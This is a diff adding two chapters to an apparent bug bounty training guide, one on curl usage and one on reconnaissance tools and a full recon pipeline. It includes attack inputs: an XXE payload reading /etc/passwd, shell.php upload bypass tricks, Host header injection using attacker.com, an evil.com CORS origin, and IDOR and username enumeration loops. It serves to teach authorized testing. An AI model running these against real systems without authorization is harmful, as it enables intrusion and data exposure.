@@ -2342,7 +2342,1138 @@ Burp Suite is the central tool for web application security testing. The Proxy i
 - [ ] Have installed at least 3 extensions (Autorize, Param Miner, JWT Editor)
 
 ---
+# Chapter 8: curl and the Command Line
 
+## Objective
+
+Master curl — the command-line HTTP client used by every professional security researcher. Learn how to craft, send, and analyze HTTP requests from the terminal, and how to integrate curl into automation pipelines and bug bounty workflows.
+
+## Prerequisites
+
+- Chapter 5: Linux for Bug Bounty Hunters
+- Chapter 3: HTTP — The Language of the Web
+
+## Terminology
+
+|Term|Definition|
+|---|---|
+|**curl**|A command-line tool for transferring data with URLs — supports HTTP, HTTPS, FTP, and more|
+|**Flag / Option**|A modifier passed to curl that changes its behavior (e.g., `-X`, `-H`, `-d`)|
+|**Request Header**|A key-value pair sent with the HTTP request (e.g., `Authorization`, `Content-Type`)|
+|**Response Header**|A key-value pair returned by the server in the HTTP response|
+|**Verbose Mode**|curl's `-v` flag — shows the full request and response including headers|
+|**Silent Mode**|curl's `-s` flag — suppresses progress output, useful in scripts|
+|**Follow Redirect**|curl's `-L` flag — automatically follows HTTP 301/302 redirects|
+|**Cookie Jar**|A file that stores cookies across multiple curl requests|
+|**Data / Body**|The request body sent with POST/PUT requests (`-d` flag)|
+|**Proxy**|Routing curl traffic through Burp Suite for interception (`--proxy`)|
+
+---
+
+## Theory
+
+### Why curl Matters for Bug Bounty
+
+Burp Suite is your primary tool for interactive testing, but curl is indispensable for:
+
+- **Automation** — scripting repetitive requests without a GUI
+- **Quick checks** — testing a single endpoint from the terminal in seconds
+- **Pipeline integration** — piping output from recon tools into curl for validation
+- **Reproducing findings** — generating curl one-liners to include in bug reports
+- **Header manipulation** — sending precise, custom HTTP requests with full control
+
+Understanding curl deeply also reinforces your understanding of HTTP itself — every flag maps directly to an HTTP concept covered in Chapter 3.
+
+---
+
+## Core curl Syntax
+
+```bash
+curl [OPTIONS] URL
+```
+
+The URL is always the final argument. Options come before it.
+
+---
+
+## Essential Flags — The Daily Toolkit
+
+### Viewing the Response
+
+```bash
+# Basic GET request — outputs response body to terminal
+curl https://example.com
+
+# Include response headers in output
+curl -i https://example.com
+
+# Show ONLY response headers (sends HEAD request)
+curl -I https://example.com
+
+# Verbose mode — shows full request AND response headers
+curl -v https://example.com
+
+# Even more verbose (shows TLS handshake details)
+curl -vvv https://example.com
+
+# Silent mode — suppress progress meter (useful in scripts)
+curl -s https://example.com
+
+# Silent but still show errors
+curl -sS https://example.com
+```
+
+### Saving Output
+
+```bash
+# Save response body to a file
+curl -o output.html https://example.com
+
+# Save with the remote filename
+curl -O https://example.com/report.pdf
+
+# Save headers to one file, body to another
+curl -D headers.txt -o body.html https://example.com
+```
+
+### Following Redirects
+
+```bash
+# Follow redirects automatically (critical for testing login flows)
+curl -L https://example.com/login
+
+# Follow redirects and show all intermediate responses
+curl -Liv https://example.com/login
+```
+
+---
+
+## HTTP Methods
+
+```bash
+# GET (default)
+curl https://example.com/api/users
+
+# POST
+curl -X POST https://example.com/api/login
+
+# PUT
+curl -X PUT https://example.com/api/users/123
+
+# DELETE
+curl -X DELETE https://example.com/api/users/123
+
+# PATCH
+curl -X PATCH https://example.com/api/users/123
+
+# OPTIONS (useful for CORS testing)
+curl -X OPTIONS https://example.com/api/users -v
+
+# HEAD
+curl -X HEAD https://example.com/ -v
+```
+
+---
+
+## Sending Data (Request Bodies)
+
+### URL-Encoded Form Data
+
+```bash
+# Standard form POST (Content-Type: application/x-www-form-urlencoded)
+curl -X POST https://example.com/login \
+  -d "username=alice&password=secret"
+
+# curl sets Content-Type automatically when using -d
+# Equivalent explicit version:
+curl -X POST https://example.com/login \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "username=alice&password=secret"
+```
+
+### JSON Data
+
+```bash
+# POST JSON body (must set Content-Type manually)
+curl -X POST https://api.example.com/users \
+  -H "Content-Type: application/json" \
+  -d '{"username": "alice", "email": "alice@test.com"}'
+
+# Read JSON body from a file
+curl -X POST https://api.example.com/users \
+  -H "Content-Type: application/json" \
+  -d @payload.json
+```
+
+### Multipart Form Data (File Uploads)
+
+```bash
+# Upload a file
+curl -X POST https://example.com/upload \
+  -F "file=@/path/to/shell.php" \
+  -F "description=test"
+
+# Upload with a custom filename (to test extension bypass)
+curl -X POST https://example.com/upload \
+  -F "file=@shell.php;filename=shell.php.jpg"
+
+# Upload with a custom Content-Type (to test MIME validation)
+curl -X POST https://example.com/upload \
+  -F "file=@shell.php;type=image/jpeg"
+```
+
+### Raw Body
+
+```bash
+# Send a raw XML body
+curl -X POST https://example.com/api \
+  -H "Content-Type: application/xml" \
+  --data-raw '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
+```
+
+---
+
+## Setting Headers
+
+```bash
+# Add a single custom header
+curl https://example.com/api/profile \
+  -H "Authorization: Bearer eyJhbGci..."
+
+# Add multiple headers
+curl https://example.com/api/profile \
+  -H "Authorization: Bearer eyJhbGci..." \
+  -H "X-Custom-Header: test" \
+  -H "Accept: application/json"
+
+# Override the User-Agent
+curl https://example.com \
+  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+
+# Test CORS with a crafted Origin header
+curl -v https://api.example.com/data \
+  -H "Origin: https://evil.com" \
+  -H "Authorization: Bearer TOKEN"
+
+# Host header injection test
+curl https://example.com/reset-password \
+  -X POST \
+  -H "Host: attacker.com" \
+  -d "email=victim@example.com"
+
+# X-Forwarded-For bypass attempt
+curl https://example.com/admin \
+  -H "X-Forwarded-For: 127.0.0.1"
+```
+
+---
+
+## Working with Cookies
+
+```bash
+# Send a specific cookie
+curl https://example.com/dashboard \
+  -H "Cookie: session=abc123def456"
+
+# Or using the -b flag
+curl https://example.com/dashboard \
+  -b "session=abc123def456"
+
+# Save cookies to a file (cookie jar)
+curl -c cookies.txt https://example.com/login \
+  -X POST \
+  -d "username=alice&password=secret"
+
+# Load and save cookies (full session simulation)
+curl -b cookies.txt -c cookies.txt https://example.com/dashboard
+
+# Multiple cookies
+curl https://example.com \
+  -b "session=abc123; role=user; remember=true"
+```
+
+---
+
+## TLS / SSL Options
+
+```bash
+# Ignore SSL certificate errors (for testing with self-signed certs)
+curl -k https://dev.example.com
+
+# Specify a client certificate
+curl https://example.com \
+  --cert client.crt \
+  --key client.key
+
+# Show TLS certificate information
+curl -vI https://example.com 2>&1 | grep -A 20 "Server certificate"
+
+# Force a specific TLS version
+curl --tlsv1.2 https://example.com
+curl --tlsv1.3 https://example.com
+```
+
+---
+
+## Routing Through Burp Suite
+
+The most important curl trick for bug bounty: route your curl requests through Burp for interception and analysis.
+
+```bash
+# Route through Burp Suite (default proxy: 127.0.0.1:8080)
+curl https://example.com \
+  --proxy http://127.0.0.1:8080 \
+  -k
+
+# The -k flag is required because Burp uses its own CA certificate
+
+# Route through Burp with authentication
+curl https://example.com/api/data \
+  --proxy http://127.0.0.1:8080 \
+  -k \
+  -H "Authorization: Bearer TOKEN"
+
+# Alias to make this easier (add to ~/.bashrc)
+alias burpcurl='curl --proxy http://127.0.0.1:8080 -k'
+# Then use:
+burpcurl https://example.com/api/data -H "Authorization: Bearer TOKEN"
+```
+
+---
+
+## Output Formatting and Processing
+
+```bash
+# Format the response time (useful for timing attacks)
+curl -o /dev/null -s -w "Time: %{time_total}s\nStatus: %{http_code}\n" \
+  https://example.com/login \
+  -X POST \
+  -d "username=admin&password=wrong"
+
+# Available write-out variables:
+# %{http_code}     - Response status code
+# %{time_total}    - Total time in seconds
+# %{time_connect}  - TCP connection time
+# %{size_download} - Response body size in bytes
+# %{url_effective} - Final URL after redirects
+
+# Pipe JSON response to jq for formatting
+curl -s https://api.example.com/users \
+  -H "Authorization: Bearer TOKEN" | jq .
+
+# Extract a specific field
+curl -s https://api.example.com/users/me \
+  -H "Authorization: Bearer TOKEN" | jq '.email'
+
+# Extract all emails from a list
+curl -s https://api.example.com/users \
+  -H "Authorization: Bearer TOKEN" | jq '.[].email'
+```
+
+---
+
+## Rate Limiting and Timing
+
+```bash
+# Add a delay between requests (to avoid triggering rate limits)
+curl --limit-rate 100K https://example.com
+
+# Set connection and read timeouts
+curl --connect-timeout 10 --max-time 30 https://example.com
+
+# Retry on failure
+curl --retry 3 --retry-delay 2 https://example.com
+```
+
+---
+
+## Practical Bug Bounty Workflows
+
+### Testing IDOR in a Loop
+
+```bash
+#!/bin/bash
+# Test access to orders 5000-5050 using Account A's session
+SESSION="ACCOUNT_A_SESSION_TOKEN"
+
+for id in $(seq 5000 5050); do
+  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
+    "https://example.com/api/orders/$id" \
+    -H "Cookie: session=$SESSION")
+  
+  if [ "$STATUS" = "200" ]; then
+    echo "[POTENTIAL IDOR] Order $id returned 200"
+    curl -s "https://example.com/api/orders/$id" \
+      -H "Cookie: session=$SESSION" | jq '.user_id'
+  fi
+done
+```
+
+### Testing for Reflected Headers
+
+```bash
+# Test if User-Agent is reflected in the response
+curl -s https://example.com/error \
+  -H "User-Agent: REFLECTED_TEST_12345" | grep "REFLECTED_TEST_12345"
+
+# Test if X-Forwarded-For is reflected
+curl -s https://example.com/profile \
+  -H "X-Forwarded-For: XFFTEST99999" \
+  -H "Cookie: session=TOKEN" | grep "XFFTEST99999"
+```
+
+### Testing Password Reset for Host Header Injection
+
+```bash
+curl -v -X POST https://example.com/reset-password \
+  -H "Host: YOUR-COLLABORATOR.burpcollaborator.net" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "email=your-test-account@example.com"
+
+# Watch your Collaborator server for a DNS/HTTP hit containing the reset token
+```
+
+### Generating curl Commands from Burp
+
+In Burp Suite, right-click any request → **Copy as curl command**. This gives you a ready-to-run curl one-liner with all headers and body preserved — perfect for including in bug reports as a reproducible proof of concept.
+
+### SSRF Testing
+
+```bash
+# Test SSRF by submitting your Collaborator URL as the target
+curl -s -X POST https://example.com/api/fetch \
+  -H "Content-Type: application/json" \
+  -H "Cookie: session=TOKEN" \
+  -d '{"url": "http://YOUR-COLLABORATOR.burpcollaborator.net/ssrf-test"}'
+```
+
+### Timing Attack for Username Enumeration
+
+```bash
+#!/bin/bash
+# Compare response times for existing vs non-existing usernames
+
+echo "=== Testing existing username ==="
+curl -o /dev/null -s -w "Time: %{time_total}s\n" \
+  -X POST https://example.com/login \
+  -d "username=known@example.com&password=wrongpassword"
+
+echo "=== Testing non-existing username ==="
+curl -o /dev/null -s -w "Time: %{time_total}s\n" \
+  -X POST https://example.com/login \
+  -d "username=doesnotexist@example.com&password=wrongpassword"
+
+# If times differ consistently → username enumeration via timing
+```
+
+---
+
+## Quick Reference Card
+
+```bash
+# GET with auth
+curl -s https://api.example.com/me -H "Authorization: Bearer TOKEN"
+
+# POST JSON
+curl -s -X POST https://api.example.com/data \
+  -H "Content-Type: application/json" \
+  -d '{"key":"value"}' \
+  -H "Cookie: session=TOKEN"
+
+# Check headers only
+curl -sI https://example.com
+
+# Follow redirects + verbose
+curl -Lv https://example.com/login
+
+# Through Burp
+curl -sk --proxy http://127.0.0.1:8080 https://example.com/api/data
+
+# Get status code only
+curl -s -o /dev/null -w "%{http_code}" https://example.com/path
+
+# Upload file
+curl -s -X POST https://example.com/upload \
+  -F "file=@test.jpg" \
+  -H "Cookie: session=TOKEN"
+
+# Test CORS
+curl -sv https://api.example.com/data \
+  -H "Origin: https://evil.com" | grep -i "access-control"
+```
+
+---
+
+## Summary
+
+curl is the Swiss Army knife of HTTP testing. It lets you craft precise HTTP requests from the command line — any method, any header, any body, any cookie. In bug bounty, it is essential for quick endpoint validation, automation scripting, IDOR loops, header injection testing, and generating reproducible proof-of-concept commands for reports. Routing curl through Burp (`--proxy http://127.0.0.1:8080 -k`) lets you capture and inspect every request interactively. The `-w` write-out format enables timing attacks and automated response analysis. Master curl and your testing speed increases dramatically.
+
+---
+
+## Checklist
+
+- [ ] Can send a basic GET request and view the response body
+- [ ] Can send a POST request with a JSON body and custom headers
+- [ ] Can send a POST request with URL-encoded form data
+- [ ] Can upload a file using multipart form data
+- [ ] Can set custom headers (Authorization, Cookie, Origin, Host)
+- [ ] Can view only response headers with `-I`
+- [ ] Can run curl in verbose mode (`-v`) and read the full transaction
+- [ ] Can follow redirects with `-L`
+- [ ] Can save response body and headers to files
+- [ ] Can route curl through Burp Suite (`--proxy http://127.0.0.1:8080 -k`)
+- [ ] Can use `-w` to extract response status codes and timing
+- [ ] Can pipe curl output to `jq` for JSON processing
+- [ ] Can write a simple bash loop using curl to test multiple IDs
+- [ ] Know how to generate a curl command from Burp Suite (Copy as curl)
+---
+
+# Chapter 9: Reconnaissance Tools
+
+## Objective
+
+Build a complete mental map of the core reconnaissance tool ecosystem — what each tool does, when to use it, how to use it effectively, and how tools chain together into a coherent recon workflow. By the end of this chapter you will know exactly which tool to reach for at every stage of reconnaissance.
+
+## Prerequisites
+
+- Chapter 5: Linux for Bug Bounty Hunters
+- Chapter 6: Setting Up Your Lab Environment
+- Chapter 8: curl and the Command Line
+
+## Terminology
+
+|Term|Definition|
+|---|---|
+|**Recon**|Short for reconnaissance — the information-gathering phase before active testing|
+|**Passive tool**|A tool that collects information without sending traffic to the target|
+|**Active tool**|A tool that sends traffic directly to the target|
+|**Pipeline**|Chaining multiple tools so the output of one feeds the input of the next|
+|**Wordlist**|A file of words, paths, or values used as input for fuzzing and brute-forcing|
+|**Rate limiting**|Intentionally throttling how fast a tool sends requests|
+|**Go tool**|A tool written in Go — fast, single-binary, easy to install|
+|**API key**|A credential required by some tools to access paid data sources|
+|**SecLists**|A widely-used collection of security wordlists maintained by Daniel Miessler|
+|**ProjectDiscovery**|A team that builds many of the most popular open-source bug bounty recon tools|
+
+---
+
+## Theory
+
+### The Recon Tool Ecosystem
+
+Reconnaissance tools fall into four categories:
+
+```
+1. SUBDOMAIN DISCOVERY     → Find all subdomains of the target
+2. HTTP PROBING            → Determine which hosts are alive and what they serve
+3. URL / CONTENT DISCOVERY → Find paths, files, endpoints, and parameters
+4. INFORMATION EXTRACTION  → Pull secrets, endpoints, and data from responses
+```
+
+No single tool does everything well. Professional researchers chain tools together, with the output of each stage feeding the next.
+
+---
+
+## Category 1: Subdomain Discovery
+
+### subfinder
+
+**What it does:** Queries dozens of passive data sources simultaneously — certificate transparency logs, DNS datasets, search engines, and public APIs — to find subdomains without touching the target.
+
+**When to use it:** First step of every engagement. Fast, passive, reliable.
+
+```bash
+# Install
+go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
+
+# Basic usage
+subfinder -d example.com
+
+# Save to file
+subfinder -d example.com -o subdomains.txt
+
+# Silent mode (output only, no banner)
+subfinder -d example.com -silent -o subdomains.txt
+
+# Multiple domains from a file
+subfinder -dL domains.txt -silent -o all_subdomains.txt
+
+# Use all sources (slower but more complete)
+subfinder -d example.com -all -silent
+
+# Verbose — see which source found which subdomain
+subfinder -d example.com -v
+```
+
+**Configure API keys for more sources** (`~/.config/subfinder/provider-config.yaml`):
+
+```yaml
+shodan:
+  - YOUR_SHODAN_KEY
+censys:
+  - CENSYS_ID:CENSYS_SECRET
+github:
+  - YOUR_GITHUB_TOKEN
+securitytrails:
+  - YOUR_ST_KEY
+```
+
+---
+
+### amass
+
+**What it does:** The most comprehensive subdomain enumeration tool — combines passive sources, active DNS resolution, brute-forcing, and graph-based analysis. Slower than subfinder but finds more.
+
+**When to use it:** For thorough engagements where completeness matters more than speed.
+
+```bash
+# Install
+go install -v github.com/owasp-amass/amass/v4/...@master
+
+# Passive only (no target interaction)
+amass enum -passive -d example.com -o amass_results.txt
+
+# Active enumeration (includes DNS brute-force)
+amass enum -active -d example.com -o amass_active.txt
+
+# Brute-force with a wordlist
+amass enum -brute -d example.com \
+  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
+
+# Track changes over time (uses a local database)
+amass enum -d example.com -dir ~/.amass/example.com
+
+# Intelligence gathering (find related domains by ASN/org)
+amass intel -org "Example Corp"
+amass intel -asn 12345
+```
+
+---
+
+### assetfinder
+
+**What it does:** Lightweight, fast passive subdomain finder using a smaller set of sources. Good for quick checks.
+
+```bash
+# Install
+go install -v github.com/tomnomnom/assetfinder@latest
+
+# Find all related domains (may include parent domains)
+assetfinder example.com
+
+# Only return subdomains of the target
+assetfinder --subs-only example.com > assetfinder.txt
+```
+
+---
+
+### crt.sh (Certificate Transparency)
+
+**What it does:** Queries the public certificate transparency log database directly. Finds subdomains from SSL/TLS certificate records — including historical ones.
+
+```bash
+# Command-line query
+curl -s "https://crt.sh/?q=%.example.com&output=json" \
+  | jq -r '.[].name_value' \
+  | sed 's/\*\.//g' \
+  | sort -u > crtsh.txt
+
+# Filter for unique clean results
+curl -s "https://crt.sh/?q=%.example.com&output=json" \
+  | jq -r '.[].name_value' \
+  | sed 's/\*\.//g' \
+  | grep -v "^$" \
+  | sort -u
+```
+
+---
+
+## Category 2: HTTP Probing
+
+### httpx
+
+**What it does:** Takes a list of hostnames or URLs and probes each one over HTTP/HTTPS, returning status codes, titles, technologies, and other metadata. The essential filter between "subdomains found" and "live targets worth testing."
+
+**When to use it:** Always — run every subdomain list through httpx before doing anything else.
+
+```bash
+# Install
+go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
+
+# Basic alive check
+cat subdomains.txt | httpx -silent
+
+# Include status code and page title
+cat subdomains.txt | httpx -silent -sc -title
+
+# Include content length
+cat subdomains.txt | httpx -silent -sc -title -cl
+
+# Detect technologies (Wappalyzer-style)
+cat subdomains.txt | httpx -silent -tech-detect
+
+# Full output — status, title, content-length, tech
+cat subdomains.txt | httpx -silent -sc -title -cl -tech-detect -o live.txt
+
+# Follow redirects
+cat subdomains.txt | httpx -silent -follow-redirects -sc -title
+
+# Only show specific status codes
+cat subdomains.txt | httpx -silent -mc 200,403
+
+# JSON output for processing
+cat subdomains.txt | httpx -silent -json -o results.json
+
+# Set rate limit (requests per second)
+cat subdomains.txt | httpx -silent -rl 50 -sc -title
+
+# Take screenshots (requires chromium)
+cat subdomains.txt | httpx -silent -screenshot -srd screenshots/
+```
+
+---
+
+### gowitness
+
+**What it does:** Takes screenshots of web pages at scale. Invaluable for visually reviewing dozens or hundreds of hosts quickly — you can spot admin panels, login pages, and interesting apps far faster than visiting each one manually.
+
+```bash
+# Install
+go install github.com/sensepost/gowitness@latest
+
+# Screenshot a single URL
+gowitness single https://example.com
+
+# Screenshot a list of URLs
+gowitness file -f live_hosts.txt
+
+# Screenshot a list and generate an HTML report
+gowitness file -f live_hosts.txt --write-db
+gowitness report serve   # Opens a browser-based report at localhost:7171
+
+# Screenshot with custom resolution
+gowitness file -f live_hosts.txt --resolution 1920x1080
+```
+
+---
+
+## Category 3: URL and Content Discovery
+
+### ffuf (Fast Web Fuzzer)
+
+**What it does:** Sends many requests with varied payloads to discover hidden paths, files, parameters, subdomains, and more. The most versatile fuzzer in the toolkit.
+
+**When to use it:** Directory/file discovery, parameter fuzzing, virtual host discovery.
+
+```bash
+# Install
+go install -v github.com/ffuf/ffuf/v2@latest
+
+# Basic directory fuzzing
+ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
+     -u https://example.com/FUZZ
+
+# Filter out 404s by size (find the 404 page size first, then exclude it)
+ffuf -w wordlist.txt -u https://example.com/FUZZ -fs 1234
+
+# Show only specific status codes
+ffuf -w wordlist.txt -u https://example.com/FUZZ -mc 200,301,302,403
+
+# Recursive fuzzing
+ffuf -w wordlist.txt -u https://example.com/FUZZ \
+     -recursion -recursion-depth 3 -mc 200,301,302,403
+
+# Fuzz file extensions
+ffuf -w wordlist.txt -u https://example.com/FUZZ \
+     -e .php,.html,.js,.json,.bak,.env,.xml -mc 200,301,302,403
+
+# Fuzz a POST parameter
+ffuf -w payloads.txt \
+     -u https://example.com/login \
+     -X POST \
+     -d "username=FUZZ&password=test" \
+     -H "Content-Type: application/x-www-form-urlencoded" \
+     -mc 200
+
+# Fuzz a JSON parameter
+ffuf -w payloads.txt \
+     -u https://example.com/api/login \
+     -X POST \
+     -H "Content-Type: application/json" \
+     -d '{"username":"FUZZ","password":"test"}' \
+     -mc 200
+
+# Virtual host discovery (subdomain brute-force via Host header)
+ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+     -u https://example.com \
+     -H "Host: FUZZ.example.com" \
+     -mc 200,301,302,403 \
+     -fs 1234   # Filter out the default response size
+
+# Save results to JSON
+ffuf -w wordlist.txt -u https://example.com/FUZZ -o results.json -of json
+
+# Rate limit (requests per second)
+ffuf -w wordlist.txt -u https://example.com/FUZZ -rate 100
+```
+
+**Recommended wordlists:**
+
+|Wordlist|Use Case|
+|---|---|
+|`Discovery/Web-Content/common.txt`|Fast initial scan (~4,700 words)|
+|`Discovery/Web-Content/directory-list-2.3-medium.txt`|Thorough (~220,000 words)|
+|`Discovery/Web-Content/raft-large-files.txt`|File discovery|
+|`Discovery/Web-Content/burp-parameter-names.txt`|Parameter fuzzing|
+|`Discovery/DNS/subdomains-top1million-5000.txt`|Fast DNS brute-force|
+
+---
+
+### waybackurls
+
+**What it does:** Queries the Wayback Machine (web.archive.org) for all URLs ever crawled for a domain. Reveals historical endpoints, old API versions, and forgotten paths.
+
+```bash
+# Install
+go install -v github.com/tomnomnom/waybackurls@latest
+
+# Basic usage
+echo "example.com" | waybackurls
+
+# Save to file
+echo "example.com" | waybackurls > wayback.txt
+
+# Filter for interesting file types
+echo "example.com" | waybackurls | grep -E "\.(js|json|php|env|bak|sql|xml|conf)$"
+
+# Filter for parameterized URLs (injection points)
+echo "example.com" | waybackurls | grep "?" | sort -u
+```
+
+---
+
+### gau (Get All URLs)
+
+**What it does:** Fetches URLs from multiple sources simultaneously — Wayback Machine, Common Crawl, URLScan.io, and AlienVault OTX. More comprehensive than waybackurls alone.
+
+```bash
+# Install
+go install -v github.com/lc/gau/v2/cmd/gau@latest
+
+# Basic usage
+echo "example.com" | gau
+
+# Include subdomains
+echo "example.com" | gau --subs
+
+# Filter by file extension
+echo "example.com" | gau | grep "\.js$"
+
+# Combine with waybackurls for maximum coverage
+echo "example.com" | waybackurls > urls1.txt
+echo "example.com" | gau > urls2.txt
+cat urls1.txt urls2.txt | sort -u > all_urls.txt
+```
+
+---
+
+### katana
+
+**What it does:** A modern web crawler that actively browses an application — following links, executing JavaScript, and extracting URLs from both HTML and JavaScript code. Essential for single-page applications (SPAs) where traditional crawlers miss most content.
+
+```bash
+# Install
+go install -v github.com/projectdiscovery/katana/cmd/katana@latest
+
+# Basic crawl
+katana -u https://example.com
+
+# Headless mode (executes JavaScript — required for SPAs)
+katana -u https://example.com -headless
+
+# Increase crawl depth
+katana -u https://example.com -depth 5
+
+# Extract endpoints from JavaScript files
+katana -u https://example.com -js-crawl
+
+# Full recommended command
+katana -u https://example.com \
+       -depth 5 \
+       -headless \
+       -js-crawl \
+       -silent \
+       -o katana_output.txt
+
+# Crawl multiple targets
+katana -list live_hosts.txt -headless -js-crawl -o all_crawled.txt
+```
+
+---
+
+### Arjun
+
+**What it does:** Discovers hidden HTTP parameters by trying thousands of common parameter names and observing changes in the response. Finds parameters the application accepts but does not advertise.
+
+```bash
+# Install
+pip3 install arjun --break-system-packages
+
+# Discover GET parameters
+arjun -u https://example.com/api/users
+
+# Discover POST parameters
+arjun -u https://example.com/api/users -m POST
+
+# JSON mode
+arjun -u https://example.com/api/users -m JSON
+
+# Multiple URLs from a file
+arjun --urls parameterized_urls.txt
+
+# Use a custom wordlist
+arjun -u https://example.com/profile \
+      -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
+```
+
+---
+
+## Category 4: Information Extraction
+
+### nuclei
+
+**What it does:** A template-based vulnerability scanner. Each template targets a specific misconfiguration or vulnerability pattern. The community maintains thousands of templates covering everything from exposed admin panels to known CVEs.
+
+**When to use it:** Automated baseline scanning on all live hosts. Not a replacement for manual testing — treat results as leads to investigate, not confirmed vulnerabilities.
+
+```bash
+# Install
+go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
+
+# Update templates (run frequently)
+nuclei -update-templates
+
+# Scan a single target
+nuclei -u https://example.com
+
+# Scan a list of targets
+nuclei -l live_hosts.txt
+
+# Filter by severity
+nuclei -l live_hosts.txt -severity critical,high
+
+# Run specific template categories
+nuclei -l live_hosts.txt -t ~/nuclei-templates/exposures/
+nuclei -l live_hosts.txt -t ~/nuclei-templates/misconfiguration/
+nuclei -l live_hosts.txt -t ~/nuclei-templates/takeovers/
+
+# Save output
+nuclei -l live_hosts.txt -severity critical,high -o nuclei_findings.txt
+
+# Rate limit (important — don't hammer the target)
+nuclei -l live_hosts.txt -rate-limit 50
+
+# Use Burp as proxy to capture nuclei traffic
+nuclei -u https://example.com -proxy http://127.0.0.1:8080
+```
+
+---
+
+### dnsx
+
+**What it does:** A fast DNS toolkit for resolving large lists of hostnames, checking specific record types, and extracting DNS data at scale.
+
+```bash
+# Install
+go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest
+
+# Resolve a list of hostnames (check if they have A records)
+cat subdomains.txt | dnsx -silent -a -resp-only
+
+# Get CNAME records (important for subdomain takeover detection)
+cat subdomains.txt | dnsx -silent -cname -resp
+
+# Get all record types
+cat subdomains.txt | dnsx -silent -a -aaaa -cname -mx -ns -resp
+
+# Filter for wildcard DNS (some domains resolve *.example.com to catch-all)
+dnsx -d example.com -wt -silent
+
+# Resolve and save
+cat subdomains.txt | dnsx -silent -a -o resolved.txt
+```
+
+---
+
+### anew
+
+**What it does:** Appends only new (previously unseen) lines to a file. Essential for change detection — running scans repeatedly and only alerting on new results.
+
+```bash
+# Install
+go install -v github.com/tomnomnom/anew@latest
+
+# First run: everything is new
+cat today_subdomains.txt | anew baseline.txt > new_subdomains.txt
+
+# Second run: only truly new subdomains appear
+cat tomorrow_subdomains.txt | anew baseline.txt > new_subdomains.txt
+
+# Check what's new without updating the baseline (dry run)
+cat new_results.txt | anew -d baseline.txt
+```
+
+---
+
+### gf (grep patterns)
+
+**What it does:** Applies predefined grep patterns to URL lists to find parameters likely vulnerable to specific vulnerability classes. Written by tomnomnom.
+
+```bash
+# Install
+go install -v github.com/tomnomnom/gf@latest
+
+# Clone the gf-patterns repository
+git clone https://github.com/1ndianl33t/Gf-Patterns ~/.gf
+
+# Find URLs likely vulnerable to XSS
+cat all_urls.txt | gf xss
+
+# Find URLs likely vulnerable to SSRF
+cat all_urls.txt | gf ssrf
+
+# Find URLs with redirect parameters (open redirect)
+cat all_urls.txt | gf redirect
+
+# Find URLs with SQL-injection-prone parameters
+cat all_urls.txt | gf sqli
+
+# Available patterns (varies by gf-patterns repo)
+# xss, sqli, ssrf, redirect, lfi, rce, idor, debug_logic, img-traversal, ...
+```
+
+---
+
+## Putting It Together: The Complete Recon Pipeline
+
+```bash
+#!/bin/bash
+TARGET="example.com"
+DIR="$HOME/bugbounty/targets/$TARGET/recon"
+mkdir -p $DIR
+
+echo "[*] === RECON PIPELINE: $TARGET ==="
+
+# 1. Subdomain enumeration
+echo "[*] Collecting subdomains..."
+subfinder -d $TARGET -silent > $DIR/subfinder.txt
+assetfinder --subs-only $TARGET > $DIR/assetfinder.txt
+curl -s "https://crt.sh/?q=%25.$TARGET&output=json" | \
+  jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u > $DIR/crtsh.txt
+
+cat $DIR/subfinder.txt $DIR/assetfinder.txt $DIR/crtsh.txt \
+  | sort -u > $DIR/all_subdomains.txt
+echo "[+] Unique subdomains: $(wc -l < $DIR/all_subdomains.txt)"
+
+# 2. HTTP probing
+echo "[*] Probing live hosts..."
+cat $DIR/all_subdomains.txt | httpx -silent -sc -title -cl \
+  -o $DIR/live_hosts.txt
+echo "[+] Live hosts: $(wc -l < $DIR/live_hosts.txt)"
+
+# 3. Screenshots
+echo "[*] Taking screenshots..."
+cat $DIR/live_hosts.txt | awk '{print $1}' | \
+  gowitness file -f /dev/stdin --write-db
+
+# 4. Historical URLs
+echo "[*] Collecting historical URLs..."
+echo $TARGET | waybackurls > $DIR/wayback.txt
+echo $TARGET | gau --subs >> $DIR/wayback.txt
+cat $DIR/wayback.txt | sort -u > $DIR/all_urls.txt
+echo "[+] Historical URLs: $(wc -l < $DIR/all_urls.txt)"
+
+# 5. Filter interesting URLs
+cat $DIR/all_urls.txt | grep "?" | sort -u > $DIR/parameterized.txt
+cat $DIR/all_urls.txt | grep -E "\.(js)$" | sort -u > $DIR/js_files.txt
+cat $DIR/all_urls.txt | gf ssrf > $DIR/ssrf_candidates.txt
+cat $DIR/all_urls.txt | gf xss > $DIR/xss_candidates.txt
+cat $DIR/all_urls.txt | gf redirect > $DIR/redirect_candidates.txt
+
+# 6. Content discovery on live hosts
+echo "[*] Fuzzing directories on live hosts..."
+cat $DIR/live_hosts.txt | awk '{print $1}' | while read host; do
+  ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
+       -u "$host/FUZZ" -mc 200,301,302,403 \
+       -o "$DIR/ffuf_$(echo $host | md5sum | cut -d' ' -f1).json" \
+       -of json -silent -rate 50
+done
+
+# 7. Nuclei scan
+echo "[*] Running nuclei..."
+nuclei -l $DIR/live_hosts.txt \
+       -severity critical,high \
+       -rate-limit 30 \
+       -o $DIR/nuclei_findings.txt \
+       -silent
+
+echo ""
+echo "[*] === COMPLETE ==="
+echo "Subdomains:  $(wc -l < $DIR/all_subdomains.txt)"
+echo "Live hosts:  $(wc -l < $DIR/live_hosts.txt)"
+echo "URLs:        $(wc -l < $DIR/all_urls.txt)"
+echo "Nuclei hits: $(wc -l < $DIR/nuclei_findings.txt)"
+```
+
+---
+
+## Tool Quick Reference
+
+|Tool|Category|Install|Primary Use|
+|---|---|---|---|
+|`subfinder`|Subdomain|`go install`|Fast passive subdomain enum|
